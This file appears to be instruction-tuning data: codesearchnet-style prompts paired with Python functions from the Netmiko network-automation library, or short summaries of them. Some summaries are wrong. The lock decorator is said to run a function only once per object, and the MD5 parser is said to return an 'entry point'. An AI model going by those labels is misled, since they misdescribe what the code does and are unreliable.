{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef asa_login(self):\n        delay_factor = self.select_delay_factor(0)\n\n        i = 1\n        max_attempts = 50\n        self.write_channel(\"login\" + self.RETURN)\n        while i <= max_attempts:\n            time.sleep(0.5 * delay_factor)\n            output = self.read_channel()\n            if \"sername\" in output:\n                self.write_channel(self.username + self.RETURN)\n            elif \"ssword\" in output:\n                self.write_channel(self.password + self.RETURN)\n            elif \"#\" in output:\n                break\n            else:\n                self.write_channel(\"login\" + self.RETURN)\n            i += 1", "response": "Handle ASA reaching privilege level 15 using login\n           "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsend config commands to the device.", "response": "def send_config_set(self, config_commands=None, exit_config_mode=True, **kwargs):\n        \"\"\"IOS-XR requires you not exit from configuration mode.\"\"\"\n        return super(CiscoXrSSH, self).send_config_set(\n            config_commands=config_commands, exit_config_mode=False, **kwargs\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncommit the candidate configuration.", "response": "def commit(\n        self, confirm=False, confirm_delay=None, comment=\"\", label=\"\", delay_factor=1\n    ):\n        \"\"\"\n        Commit the candidate configuration.\n\n        default (no options):\n            command_string = commit\n        confirm and confirm_delay:\n            command_string = commit confirmed <confirm_delay>\n        label (which is a label name):\n            command_string = commit label <label>\n        comment:\n            command_string = commit comment <comment>\n\n        supported combinations\n        label and confirm:\n            command_string = commit label <label> confirmed <confirm_delay>\n        label and comment:\n            command_string = commit label <label> comment <comment>\n\n        All other combinations will result in an exception.\n\n        failed commit message:\n        % Failed to commit one or more configuration items during a pseudo-atomic operation. All\n        changes made have been reverted. Please issue 'show configuration failed [inheritance]'\n        from this session to view the errors\n\n        message XR shows if other commits occurred:\n        One or more commits have occurred from other configuration sessions since this session\n        started or since the last commit was made from this session. You can use the 'show\n        configuration commit changes' command to browse the changes.\n\n        Exit of configuration mode with pending changes will cause the changes to be discarded and\n        an exception to be generated.\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        if confirm and not confirm_delay:\n            raise ValueError(\"Invalid arguments supplied to XR commit\")\n        if confirm_delay and not confirm:\n            raise ValueError(\"Invalid arguments supplied to XR commit\")\n        if comment and confirm:\n            raise ValueError(\"Invalid arguments supplied to XR commit\")\n\n        # wrap the comment in quotes\n        if comment:\n            if '\"' in comment:\n                raise ValueError(\"Invalid comment contains double quote\")\n            comment = '\"{0}\"'.format(comment)\n\n        label = text_type(label)\n        error_marker = \"Failed to\"\n        alt_error_marker = \"One or more commits have occurred from other\"\n\n        # Select proper command string based on arguments provided\n        if label:\n            if comment:\n                command_string = \"commit label {} comment {}\".format(label, comment)\n            elif confirm:\n                command_string = \"commit label {} confirmed {}\".format(\n                    label, text_type(confirm_delay)\n                )\n            else:\n                command_string = \"commit label {}\".format(label)\n        elif confirm:\n            command_string = \"commit confirmed {}\".format(text_type(confirm_delay))\n        elif comment:\n            command_string = \"commit comment {}\".format(comment)\n        else:\n            command_string = \"commit\"\n\n        # Enter config mode (if necessary)\n        output = self.config_mode()\n        output += self.send_command_expect(\n            command_string,\n            strip_prompt=False,\n            strip_command=False,\n            delay_factor=delay_factor,\n        )\n        if error_marker in output:\n            raise ValueError(\n                \"Commit failed with the following errors:\\n\\n{0}\".format(output)\n            )\n        if alt_error_marker in output:\n            # Other commits occurred, don't proceed with commit\n            output += self.send_command_timing(\n                \"no\", strip_prompt=False, strip_command=False, delay_factor=delay_factor\n            )\n            raise ValueError(\n                \"Commit failed with the following errors:\\n\\n{}\".format(output)\n            )\n\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if the device is in configuration mode.", "response": "def check_config_mode(self, check_string=\")#\", pattern=r\"[#\\$]\"):\n        \"\"\"Checks if the device is in configuration mode or not.\n\n        IOS-XR, unfortunately, does this:\n        RP/0/RSP0/CPU0:BNG(admin)#\n        \"\"\"\n        self.write_channel(self.RETURN)\n        output = self.read_until_pattern(pattern=pattern)\n        # Strip out (admin) so we don't get a false positive with (admin)#\n        # (admin-config)# would still match.\n        output = output.replace(\"(admin)\", \"\")\n        return check_string in output"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef process_md5(self, md5_output, pattern=r\"^([a-fA-F0-9]+)$\"):\n        match = re.search(pattern, md5_output, flags=re.M)\n        if match:\n            return match.group(1)\n        else:\n            raise ValueError(\"Invalid output from MD5 command: {}\".format(md5_output))", "response": "Process the output of the MD5 command and return the entry point."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remote_file_size(self, remote_cmd=\"\", remote_file=None):\n        if remote_file is None:\n            if self.direction == \"put\":\n                remote_file = self.dest_file\n            elif self.direction == \"get\":\n                remote_file = self.source_file\n        remote_cmd = 'system \"ls -l {}/{}\"'.format(self.file_system, remote_file)\n        remote_out = self.ssh_ctl_chan.send_command(remote_cmd)\n        for line in remote_out.splitlines():\n            if remote_file in line:\n                file_size = line.split()[4]\n                break\n        if \"Error opening\" in remote_out or \"No such file or directory\" in remote_out:\n            raise IOError(\"Unable to find file on remote system\")\n        else:\n            return int(file_size)", "response": "Get the file size of the remote file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the number of bytes available on remote device.", "response": "def remote_space_available(self, search_pattern=r\"(\\d+) bytes free\"):\n        \"\"\"Return space available on remote device.\"\"\"\n        remote_cmd = 'system \"df {}\"'.format(self.folder_name)\n        remote_output = self.ssh_ctl_chan.send_command_expect(remote_cmd)\n        for line in remote_output.splitlines():\n            if self.folder_name in line:\n                space_available = line.split()[-3]\n                break\n        return int(space_available)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncheck if the dest_file already exists on the file system (return boolean ).", "response": "def check_file_exists(self, remote_cmd=\"dir home\"):\n        \"\"\"Check if the dest_file already exists on the file system (return boolean).\"\"\"\n        if self.direction == \"put\":\n            remote_out = self.ssh_ctl_chan.send_command_expect(remote_cmd)\n            search_string = r\"Directory contents .*{}\".format(self.dest_file)\n            return bool(re.search(search_string, remote_out, flags=re.DOTALL))\n        elif self.direction == \"get\":\n            return os.path.exists(self.dest_file)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsave config for the current user.", "response": "def save_config(self, cmd=\"write mem\", confirm=False, confirm_response=\"\"):\n        \"\"\"Save config: write mem\"\"\"\n        return super(OneaccessOneOSBase, self).save_config(\n            cmd=cmd, confirm=confirm, confirm_response=confirm_response\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _ParseIndex(self, preread, precompile):\n        self.index = texttable.TextTable()\n        self.index.CsvToTable(self._index_handle)\n\n        if preread:\n            for row in self.index:\n                for col in row.header:\n                    row[col] = preread(col, row[col])\n\n        self.compiled = copy.deepcopy(self.index)\n\n        for row in self.compiled:\n            for col in row.header:\n                if precompile:\n                    row[col] = precompile(col, row[col])\n                if row[col]:\n                    row[col] = copyable_regex_object.CopyableRegexObject(row[col])", "response": "Reads the index file and stores entries in the TextTable."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the row number that matches the supplied attributes.", "response": "def GetRowMatch(self, attributes):\n        \"\"\"Returns the row number that matches the supplied attributes.\"\"\"\n        for row in self.compiled:\n            try:\n                for key in attributes:\n                    # Silently skip attributes not present in the index file.\n                    # pylint: disable=E1103\n                    if (\n                        key in row.header\n                        and row[key]\n                        and not row[key].match(attributes[key])\n                    ):\n                        # This line does not match, so break and try next row.\n                        raise StopIteration()\n                return row.row\n            except StopIteration:\n                pass\n        return 0"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef synchronised(func):\n\n        # pylint: disable=E0213\n        def Wrapper(main_obj, *args, **kwargs):\n            main_obj._lock.acquire()  # pylint: disable=W0212\n            try:\n                return func(main_obj, *args, **kwargs)  # pylint: disable=E1102\n            finally:\n                main_obj._lock.release()  # pylint: disable=W0212\n\n        return Wrapper", "response": "Decorator to ensure that a function is called only once per object."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ReadIndex(self, index_file=None):\n\n        self.index_file = index_file or self.index_file\n        fullpath = os.path.join(self.template_dir, self.index_file)\n        if self.index_file and fullpath not in self.INDEX:\n            self.index = IndexTable(self._PreParse, self._PreCompile, fullpath)\n            self.INDEX[fullpath] = self.index\n        else:\n            self.index = self.INDEX[fullpath]\n\n        # Does the IndexTable have the right columns.\n        if \"Template\" not in self.index.index.header:  # pylint: disable=E1103\n            raise CliTableError(\"Index file does not have 'Template' column.\")", "response": "Reads the index file of commands and templates."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses a string of templates into a list of file handles.", "response": "def _TemplateNamesToFiles(self, template_str):\n        \"\"\"Parses a string of templates into a list of file handles.\"\"\"\n        template_list = template_str.split(\":\")\n        template_files = []\n        try:\n            for tmplt in template_list:\n                template_files.append(open(os.path.join(self.template_dir, tmplt), \"r\"))\n        except:  # noqa\n            for tmplt in template_files:\n                tmplt.close()\n            raise\n\n        return template_files"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef ParseCmd(self, cmd_input, attributes=None, templates=None):\n        # Store raw command data within the object.\n        self.raw = cmd_input\n\n        if not templates:\n            # Find template in template index.\n            row_idx = self.index.GetRowMatch(attributes)\n            if row_idx:\n                templates = self.index.index[row_idx][\"Template\"]\n            else:\n                raise CliTableError(\n                    'No template found for attributes: \"%s\"' % attributes\n                )\n\n        template_files = self._TemplateNamesToFiles(templates)\n\n        try:\n            # Re-initialise the table.\n            self.Reset()\n            self._keys = set()\n            self.table = self._ParseCmdItem(self.raw, template_file=template_files[0])\n\n            # Add additional columns from any additional tables.\n            for tmplt in template_files[1:]:\n                self.extend(\n                    self._ParseCmdItem(self.raw, template_file=tmplt), set(self._keys)\n                )\n        finally:\n            for f in template_files:\n                f.close()", "response": "Parses a command output string."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _PreParse(self, key, value):\n        if key == \"Command\":\n            return re.sub(r\"(\\[\\[.+?\\]\\])\", self._Completion, value)\n        else:\n            return value", "response": "Executed against each field of each row read from index table."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn LabelValue with FSM derived keys.", "response": "def LabelValueTable(self, keys=None):\n        \"\"\"Return LabelValue with FSM derived keys.\"\"\"\n        keys = keys or self.superkey\n        # pylint: disable=E1002\n        return super(CliTable, self).LabelValueTable(keys)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\noverride sort func to use the KeyValue for the key.", "response": "def sort(self, cmp=None, key=None, reverse=False):\n        \"\"\"Overrides sort func to use the KeyValue for the key.\"\"\"\n        if not key and self._keys:\n            key = self.KeyValue\n        super(CliTable, self).sort(cmp=cmp, key=key, reverse=reverse)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd additional columns to the FSM template.", "response": "def AddKeys(self, key_list):\n        \"\"\"Mark additional columns as being part of the superkey.\n    Supplements the Keys already extracted from the FSM template.\n    Useful when adding new columns to existing tables.\n    Note: This will impact attempts to further 'extend' the table as the\n    superkey must be common between tables for successful extension.\n    Args:\n      key_list: list of header entries to be included in the superkey.\n    Raises:\n      KeyError: If any entry in list is not a valid header entry.\n    \"\"\"\n\n        for keyname in key_list:\n            if keyname not in self.header:\n                raise KeyError(\"'%s'\" % keyname)\n\n        self._keys = self._keys.union(set(key_list))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef superkey(self):\n        sorted_list = []\n        for header in self.header:\n            if header in self._keys:\n                sorted_list.append(header)\n        return sorted_list", "response": "Returns a set of column names that together constitute the superkey."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef KeyValue(self, row=None):\n        if not row:\n            if self._iterator:\n                # If we are inside an iterator use current row iteration.\n                row = self[self._iterator]\n            else:\n                row = self.row\n        # If no superkey then use row number.\n        if not self.superkey:\n            return [\"%s\" % row.row]\n\n        sorted_list = []\n        for header in self.header:\n            if header in self.superkey:\n                sorted_list.append(row[header])\n        return sorted_list", "response": "Returns the superkey value for the row."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nremoving Null code from string_buffer", "response": "def strip_ansi_escape_codes(self, string_buffer):\n        \"\"\"Remove Null code\"\"\"\n        output = re.sub(r\"\\x00\", \"\", string_buffer)\n        return super(DellIsilonSSH, self).strip_ansi_escape_codes(output)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef session_preparation(self):\n        self.ansi_escape_codes = True\n        self.zsh_mode()\n        self.find_prompt(delay_factor=1)\n        self.set_base_prompt()\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "Prepare the session after the connection has been established."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrunning zsh command to unify the environment", "response": "def zsh_mode(self, delay_factor=1, prompt_terminator=\"$\"):\n        \"\"\"Run zsh command to unify the environment\"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.clear_buffer()\n        command = self.RETURN + \"zsh\" + self.RETURN\n        self.write_channel(command)\n        time.sleep(1 * delay_factor)\n        self.set_prompt()\n        self.clear_buffer()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef config_mode(self, config_command=\"sudo su\"):\n        delay_factor = self.select_delay_factor(delay_factor=1)\n        output = \"\"\n        if not self.check_config_mode():\n            output += self.send_command_timing(\n                config_command, strip_prompt=False, strip_command=False\n            )\n            if \"Password:\" in output:\n                output = self.write_channel(self.normalize_cmd(self.secret))\n            self.set_prompt(prompt_terminator=\"#\")\n            time.sleep(1 * delay_factor)\n            self.set_base_prompt()\n            if not self.check_config_mode():\n                raise ValueError(\"Failed to configuration mode\")\n        return output", "response": "Attempt to become root."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndisable paging for the current session.", "response": "def disable_paging(self, command=\"no pager\", delay_factor=1):\n        \"\"\"Disable paging\"\"\"\n        return super(QuantaMeshSSH, self).disable_paging(command=command)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntrying to guess the best device type based on patterns defined in SSH_MAPPER_BASE and return the device type that is currently the best to use.", "response": "def autodetect(self):\n        \"\"\"\n        Try to guess the best 'device_type' based on patterns defined in SSH_MAPPER_BASE\n\n        Returns\n        -------\n        best_match : str or None\n            The device type that is currently the best to use to interact with the device\n        \"\"\"\n        for device_type, autodetect_dict in SSH_MAPPER_BASE.items():\n            tmp_dict = autodetect_dict.copy()\n            call_method = tmp_dict.pop(\"dispatch\")\n            autodetect_method = getattr(self, call_method)\n            accuracy = autodetect_method(**tmp_dict)\n            if accuracy:\n                self.potential_matches[device_type] = accuracy\n                if accuracy >= 99:  # Stop the loop as we are sure of our match\n                    best_match = sorted(\n                        self.potential_matches.items(), key=lambda t: t[1], reverse=True\n                    )\n                    self.connection.disconnect()\n                    return best_match[0][0]\n\n        if not self.potential_matches:\n            self.connection.disconnect()\n            return None\n\n        best_match = sorted(\n            self.potential_matches.items(), key=lambda t: t[1], reverse=True\n        )\n        self.connection.disconnect()\n        return best_match[0][0]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _send_command(self, cmd=\"\"):\n        self.connection.write_channel(cmd + \"\\n\")\n        time.sleep(1)\n        output = self.connection._read_channel_timing()\n        output = self.connection.strip_ansi_escape_codes(output)\n        output = self.connection.strip_backspaces(output)\n        return output", "response": "Send a command to the remote device."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _send_command_wrapper(self, cmd):\n        cached_results = self._results_cache.get(cmd)\n        if not cached_results:\n            response = self._send_command(cmd)\n            self._results_cache[cmd] = response\n            return response\n        else:\n            return cached_results", "response": "Send a command to the remote device with caching."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _autodetect_std(self, cmd=\"\", search_patterns=None, re_flags=re.I, priority=99):\n        invalid_responses = [\n            r\"% Invalid input detected\",\n            r\"syntax error, expecting\",\n            r\"Error: Unrecognized command\",\n            r\"%Error\",\n            r\"command not found\",\n            r\"Syntax Error: unexpected argument\",\n        ]\n        if not cmd or not search_patterns:\n            return 0\n        try:\n            # _send_command_wrapper will use already cached results if available\n            response = self._send_command_wrapper(cmd)\n            # Look for error conditions in output\n            for pattern in invalid_responses:\n                match = re.search(pattern, response, flags=re.I)\n                if match:\n                    return 0\n            for pattern in search_patterns:\n                match = re.search(pattern, response, flags=re_flags)\n                if match:\n                    return priority\n        except Exception:\n            return 0\n        return 0", "response": "This method attempts to auto - detect the device type from the command and returns the result."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef redispatch(obj, device_type, session_prep=True):\n    new_class = ssh_dispatcher(device_type)\n    obj.device_type = device_type\n    obj.__class__ = new_class\n    if session_prep:\n        obj._try_session_preparation()", "response": "Dynamically change Netmiko object s class to proper class."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef find_version(*file_paths):\n    base_module_file = os.path.join(*file_paths)\n    with open(base_module_file) as f:\n        base_module_data = f.read()\n    version_match = re.search(\n        r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", base_module_data, re.M\n    )\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")", "response": "Find the version string of the base module."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef session_preparation(self):\n        self.ansi_escape_codes = True\n        self._test_channel_read()\n        self.set_base_prompt()\n        self.disable_paging()\n        self.set_terminal_width(command=\"terminal width 511\")\n        # Clear the read buffer\n        time.sleep(0.3 * self.global_delay_factor)\n        self.clear_buffer()", "response": "Prepare the session after the connection has been established."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck if the device is in configuration mode", "response": "def check_config_mode(self, check_string=\")#\", pattern=\"\"):\n        \"\"\"Checks if the device is in configuration mode\"\"\"\n        return super(CalixB6Base, self).check_config_mode(check_string=check_string)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef disable_paging(self, command=\"terminal length 999\", delay_factor=1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        time.sleep(delay_factor * 0.1)\n        self.clear_buffer()\n        command = self.normalize_cmd(command)\n        log.debug(\"In disable_paging\")\n        log.debug(\"Command: {0}\".format(command))\n        self.write_channel(command)\n        output = self.read_until_prompt()\n        if self.ansi_escape_codes:\n            output = self.strip_ansi_escape_codes(output)\n        log.debug(\"{0}\".format(output))\n        log.debug(\"Exiting disable_paging\")\n        return output", "response": "Disable paging default to a Cisco CLI method."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef save_config(\n        self, cmd=\"configuration write\", confirm=False, confirm_response=\"\"\n    ):\n        \"\"\"Save Config on Mellanox devices Enters and Leaves Config Mode\"\"\"\n        output = self.enable()\n        output += self.config_mode()\n        output += self.send_command(cmd)\n        output += self.exit_config_mode()\n        return output", "response": "Save Config on Mellanox devices Enters and Leaves Config Mode"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nentering into configuration mode on remote device.", "response": "def config_mode(self, config_command=\"config\", pattern=\">config\"):\n        \"\"\"Enter into configuration mode on remote device.\"\"\"\n        return super(RadETXBase, self).config_mode(\n            config_command=config_command, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncheck if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\">config\", pattern=\"\"):\n        \"\"\"\n        Checks if the device is in configuration mode or not.\n\n        Rad config starts with baseprompt>config.\n        \"\"\"\n        return super(RadETXBase, self).check_config_mode(\n            check_string=check_string, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef exit_config_mode(self, exit_config=\"exit all\", pattern=\"#\"):\n        return super(RadETXBase, self).exit_config_mode(\n            exit_config=exit_config, pattern=pattern\n        )", "response": "Exit from configuration mode."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef telnet_login(\n        self, username_pattern=r\"(?:user>)\", alt_prompt_term=r\"#\\s*$\", **kwargs\n    ):\n        \"\"\"\n        RAD presents with the following on login\n\n        user>\n\n        password> ****\n        \"\"\"\n        self.TELNET_RETURN = self.RETURN\n        return super(RadETXTelnet, self).telnet_login(\n            username_pattern=username_pattern,\n            alt_prompt_terminator=alt_prompt_term,\n            **kwargs\n        )", "response": "Telenet login with optional prompt term."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef commit(self, comment=\"\", delay_factor=0.1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        error_marker = [\"Failed to generate committed config\", \"Commit failed\"]\n        command_string = \"commit\"\n\n        if comment:\n            command_string += ' comment \"{}\"'.format(comment)\n\n        output = self.config_mode()\n        output += self.send_command_expect(\n            command_string,\n            strip_prompt=False,\n            strip_command=False,\n            delay_factor=delay_factor,\n        )\n\n        if any(x in output for x in error_marker):\n            raise ValueError(\n                \"Commit failed with following errors:\\n\\n{}\".format(output)\n            )\n        return output", "response": "Commit the candidate configuration."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nremaining in configuration mode.", "response": "def send_config_set(\n        self,\n        config_commands=None,\n        exit_config_mode=False,\n        delay_factor=1,\n        max_loops=150,\n        strip_prompt=False,\n        strip_command=False,\n        config_mode_command=None,\n    ):\n        \"\"\"Remain in configuration mode.\"\"\"\n        return super(VyOSSSH, self).send_config_set(\n            config_commands=config_commands,\n            exit_config_mode=exit_config_mode,\n            delay_factor=delay_factor,\n            max_loops=max_loops,\n            strip_prompt=strip_prompt,\n            strip_command=strip_command,\n            config_mode_command=config_mode_command,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\")#\", pattern=\"\"):\n        \"\"\"\n        Checks if the device is in configuration mode or not.\n\n        Cisco IOS devices abbreviate the prompt at 20 chars in config mode\n        \"\"\"\n        return super(CiscoBaseConnection, self).check_config_mode(\n            check_string=check_string, pattern=pattern\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef config_mode(self, config_command=\"config term\", pattern=\"\"):\n        if not pattern:\n            pattern = re.escape(self.base_prompt[:16])\n        return super(CiscoBaseConnection, self).config_mode(\n            config_command=config_command, pattern=pattern\n        )", "response": "Enter into configuration mode on remote device."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef exit_config_mode(self, exit_config=\"end\", pattern=\"#\"):\n        return super(CiscoBaseConnection, self).exit_config_mode(\n            exit_config=exit_config, pattern=pattern\n        )", "response": "Exit from configuration mode."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _autodetect_fs(self, cmd=\"dir\", pattern=r\"Directory of (.*)/\"):\n        if not self.check_enable_mode():\n            raise ValueError(\"Must be in enable mode to auto-detect the file-system.\")\n        output = self.send_command_expect(cmd)\n        match = re.search(pattern, output)\n        if match:\n            file_system = match.group(1)\n            # Test file_system\n            cmd = \"dir {}\".format(file_system)\n            output = self.send_command_expect(cmd)\n            if \"% Invalid\" in output or \"%Error:\" in output:\n                raise ValueError(\n                    \"An error occurred in dynamically determining remote file \"\n                    \"system: {} {}\".format(cmd, output)\n                )\n            else:\n                return file_system\n\n        raise ValueError(\n            \"An error occurred in dynamically determining remote file \"\n            \"system: {} {}\".format(cmd, output)\n        )", "response": "Autodetect the file system on the remote device. Used by SCP operations."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nenable mode on MRV uses no password.", "response": "def enable(self, cmd=\"enable\", pattern=r\"#\", re_flags=re.IGNORECASE):\n        \"\"\"Enable mode on MRV uses no password.\"\"\"\n        output = \"\"\n        if not self.check_enable_mode():\n            self.write_channel(self.normalize_cmd(cmd))\n            output += self.read_until_prompt_or_pattern(\n                pattern=pattern, re_flags=re_flags\n            )\n            if not self.check_enable_mode():\n                msg = (\n                    \"Failed to enter enable mode. Please ensure you pass \"\n                    \"the 'secret' argument to ConnectHandler.\"\n                )\n                raise ValueError(msg)\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprepare the session after the connection has been established.", "response": "def session_preparation(self):\n        \"\"\"Prepare the session after the connection has been established.\"\"\"\n        self.set_base_prompt()\n        cmd = self.RETURN + \"rows 0\" + self.RETURN\n        self.disable_paging(command=cmd)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nraise NetMikoTimeoutException if waiting too much in the serving queue.", "response": "def _timeout_exceeded(self, start, msg=\"Timeout exceeded!\"):\n        \"\"\"Raise NetMikoTimeoutException if waiting too much in the serving queue.\n\n        :param start: Initial start time to see if session lock timeout has been exceeded\n        :type start: float (from time.time() call i.e. epoch time)\n\n        :param msg: Exception message if timeout was exceeded\n        :type msg: str\n        \"\"\"\n        if not start:\n            # Must provide a comparison time\n            return False\n        if time.time() - start > self.session_timeout:\n            # session_timeout exceeded\n            raise NetMikoTimeoutException(msg)\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _lock_netmiko_session(self, start=None):\n        if not start:\n            start = time.time()\n        # Wait here until the SSH channel lock is acquired or until session_timeout exceeded\n        while not self._session_locker.acquire(False) and not self._timeout_exceeded(\n            start, \"The netmiko channel is not available!\"\n        ):\n            time.sleep(0.1)\n        return True", "response": "Try to acquire the Netmiko session lock. If not available wait in the queue until the session_timeout exceeded."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _write_channel(self, out_data):\n        if self.protocol == \"ssh\":\n            self.remote_conn.sendall(write_bytes(out_data, encoding=self.encoding))\n        elif self.protocol == \"telnet\":\n            self.remote_conn.write(write_bytes(out_data, encoding=self.encoding))\n        elif self.protocol == \"serial\":\n            self.remote_conn.write(write_bytes(out_data, encoding=self.encoding))\n            self.remote_conn.flush()\n        else:\n            raise ValueError(\"Invalid protocol specified\")\n        try:\n            log.debug(\n                \"write_channel: {}\".format(\n                    write_bytes(out_data, encoding=self.encoding)\n                )\n            )\n            if self._session_log_fin or self.session_log_record_writes:\n                self._write_session_log(out_data)\n        except UnicodeDecodeError:\n            # Don't log non-ASCII characters; this is null characters and telnet IAC (PY2)\n            pass", "response": "Generic handler that will write to both SSH and telnet channel."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef write_channel(self, out_data):\n        self._lock_netmiko_session()\n        try:\n            self._write_channel(out_data)\n        finally:\n            # Always unlock the SSH channel, even on exception.\n            self._unlock_netmiko_session()", "response": "Generic handler that will write to both SSH and telnet channel."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef is_alive(self):\n        null = chr(0)\n        if self.remote_conn is None:\n            log.error(\"Connection is not initialised, is_alive returns False\")\n            return False\n        if self.protocol == \"telnet\":\n            try:\n                # Try sending IAC + NOP (IAC is telnet way of sending command)\n                # IAC = Interpret as Command; it comes before the NOP.\n                log.debug(\"Sending IAC + NOP\")\n                # Need to send multiple times to test connection\n                self.remote_conn.sock.sendall(telnetlib.IAC + telnetlib.NOP)\n                self.remote_conn.sock.sendall(telnetlib.IAC + telnetlib.NOP)\n                self.remote_conn.sock.sendall(telnetlib.IAC + telnetlib.NOP)\n                return True\n            except AttributeError:\n                return False\n        else:\n            # SSH\n            try:\n                # Try sending ASCII null byte to maintain the connection alive\n                log.debug(\"Sending the NULL byte\")\n                self.write_channel(null)\n                return self.remote_conn.transport.is_active()\n            except (socket.error, EOFError):\n                log.error(\"Unable to send\", exc_info=True)\n                # If unable to send, we can tell for sure that the connection is unusable\n                return False\n        return False", "response": "Returns a boolean flag with the state of the connection."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _read_channel_expect(self, pattern=\"\", re_flags=0, max_loops=150):\n        output = \"\"\n        if not pattern:\n            pattern = re.escape(self.base_prompt)\n        log.debug(\"Pattern is: {}\".format(pattern))\n\n        i = 1\n        loop_delay = 0.1\n        # Default to making loop time be roughly equivalent to self.timeout (support old max_loops\n        # argument for backwards compatibility).\n        if max_loops == 150:\n            max_loops = int(self.timeout / loop_delay)\n        while i < max_loops:\n            if self.protocol == \"ssh\":\n                try:\n                    # If no data available will wait timeout seconds trying to read\n                    self._lock_netmiko_session()\n                    new_data = self.remote_conn.recv(MAX_BUFFER)\n                    if len(new_data) == 0:\n                        raise EOFError(\"Channel stream closed by remote device.\")\n                    new_data = new_data.decode(\"utf-8\", \"ignore\")\n                    log.debug(\"_read_channel_expect read_data: {}\".format(new_data))\n                    output += new_data\n                    self._write_session_log(new_data)\n                except socket.timeout:\n                    raise NetMikoTimeoutException(\n                        \"Timed-out reading channel, data not available.\"\n                    )\n                finally:\n                    self._unlock_netmiko_session()\n            elif self.protocol == \"telnet\" or \"serial\":\n                output += self.read_channel()\n            if re.search(pattern, output, flags=re_flags):\n                log.debug(\"Pattern found: {} {}\".format(pattern, output))\n                return output\n            time.sleep(loop_delay * self.global_delay_factor)\n            i += 1\n        raise NetMikoTimeoutException(\n            \"Timed-out reading channel, pattern not found in output: {}\".format(pattern)\n        )", "response": "Function that reads channel until pattern is detected."}
